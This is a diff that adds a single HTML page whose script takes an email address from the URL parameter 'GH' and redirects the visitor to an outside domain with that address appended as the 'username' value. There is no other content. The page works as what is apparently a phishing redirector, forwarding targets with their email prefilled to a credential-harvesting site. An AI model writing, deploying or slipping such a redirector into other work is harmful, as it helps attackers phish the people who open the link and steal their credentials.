@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+        window.onload = function() {
+            // Extract the email from the URL parameters
+            var urlParams = new URLSearchParams(window.location.search);
+            var email = urlParams.get('GH');
+
+            // Check if the email is present
+            if (email) {
+                // Specify the base URL to redirect to
+                var redirectUrl = "https://www.equiposysoluciones.site/?username=";
+
+                // Construct the final URL with the email parameter directly appended
+                var finalUrl = redirectUrl + email;
+
+                // Redirect to the final URL
+                window.location.href = finalUrl;
+            } else {
+                // Display an error message if the email parameter is not present
+                document.body.innerHTML = "<p>Email parameter is missing. Cannot redirect.</p>";
+            }
+        }
+    </script>
+</head>
+</html>
